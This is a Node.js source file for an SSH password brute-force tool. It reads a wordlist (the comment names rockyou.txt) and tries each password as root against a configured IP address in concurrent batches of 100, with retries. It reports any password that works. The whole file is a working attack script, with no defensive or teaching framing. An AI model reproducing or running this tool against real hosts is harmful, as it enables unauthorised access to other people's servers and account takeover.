// import correct imports for reading rockyou.txt
import { ip, retriesOnUnknownError, retryDelay } from "./config.js";
import { readFileSync } from "fs";
import { NodeSSH } from "node-ssh";

let passwords = [];

async function loadPasswords() {
  console.log("Loading passwords.txt...");
  console.time("loading");
  const rockyou = readFileSync("passwords.txt", "utf-8");
  passwords = rockyou.split("\n");
  console.timeEnd("loading");
  return passwords;
}

let count = 0;

/**
 * @param {string} password
 */
async function tryConnection(password, retry = 0) {
  // console.log("Connecting to SSH server...");
  const ssh = new NodeSSH();
  try {
    await ssh.connect({
      host: ip,
      username: "root",
      password,
      tryKeyboard: true,
    });
    console.log(`FOUND CONNECTION TO ${ip} WITH PASSWORD [${password}]`);
    process.exit(0);
  } catch (error) {
    if (error.code === "ENOTFOUND") {
      console.log(`Could not connect to ${ip}: The host was not found`);
      process.exit(1);
    } else if (error.code !== "ECONNRESET") {
      if (retry < retriesOnUnknownError) {
        await new Promise((resolve) => setTimeout(resolve, retryDelay));
        await tryConnection(password, retry + 1);
      } else {
        console.log(`Could not connect to ${ip}: ${error.message}`);
      }
    }
    const percent = Math.round((++count / passwords.length) * 10000) / 100;
    if (retry) {
      console.log(`${percent}% - ${password} (${retry}x retry)`);
    } else {
      console.log(`${percent}% - ${password}`);
    }
  }
}
/**
 * @param {string[]} passwords
 */
async function batchTryConnection(passwords) {
  /** @type {Promise<void>[]} */
  const promises = passwords.map((password) => tryConnection(password));
  await Promise.all(promises);
}

async function main() {
  if (ip === "ADD IP HERE") {
    console.log("Please add the IP to config.js");
    process.exit(1);
  }
  await loadPasswords();
  console.log("Starting brute force...");
  const batchSize = 100;
  for (let i = 0; i < passwords.length; i += batchSize) {
    const batch = passwords.slice(i, i + batchSize);
    await batchTryConnection(batch);
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  console.time("brute force");
  console.timeEnd("brute force");
}

main();
